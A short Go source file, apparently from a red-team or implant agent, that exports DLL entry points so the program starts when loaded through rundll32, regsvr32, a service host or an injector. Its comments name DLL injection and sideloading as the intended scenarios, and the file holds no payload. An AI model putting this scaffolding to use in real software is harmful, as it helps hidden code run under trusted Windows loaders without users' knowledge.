package main

import "C"

// DLL exports for DLL injection / sideloading scenarios
// These are the entry points when loaded as a DLL via:
//   rundll32.exe agent.dll,Start
//   LoadLibrary("agent.dll") from injector

//export Start
func Start() {
	go main()
}

//export DllRegisterServer
func DllRegisterServer() {
	go main()
}

//export DllUnregisterServer
func DllUnregisterServer() {
	// no-op for regsvr32 compat
}

//export ServiceMain
func ServiceMain() {
	go main()
}
